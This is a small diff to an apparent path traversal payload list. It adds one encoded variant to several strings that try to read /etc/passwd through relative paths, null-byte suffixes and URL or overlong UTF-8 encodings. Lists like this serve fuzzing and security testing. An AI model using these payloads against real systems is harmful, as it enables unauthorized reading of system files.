@@ -5,6 +5,7 @@
 ../../../../../../../../etc/passwd
 /etc/passwd%00.php
 ....\/....\/....\/etc/passwd
+....\/....\/....\/....\/etc/passwd
 %5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
 ..%252f..%252f..%252fetc%252fpasswd
 ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
